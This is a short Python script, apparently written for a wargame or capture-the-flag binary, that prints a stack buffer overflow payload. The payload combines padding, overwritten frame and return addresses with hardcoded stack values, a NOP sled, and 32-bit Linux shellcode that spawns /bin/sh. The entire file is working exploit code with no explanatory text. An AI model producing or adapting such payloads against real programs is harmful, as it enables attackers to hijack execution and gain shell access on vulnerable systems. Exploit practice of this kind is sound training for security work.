#!/usr/bin/env python
import struct

# must make ebp not lower than esp
padding = "AAAA"*(0x55-0x41-1)
ebp = struct.pack("<I", 0xbffff7b0+40)
eip = struct.pack("<I", 0xbffff7ac+28)
ret = struct.pack("<I", 0x08048544)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nopslides = "\x90"*100

print padding + ebp + ret + eip + nopslides + shellcode
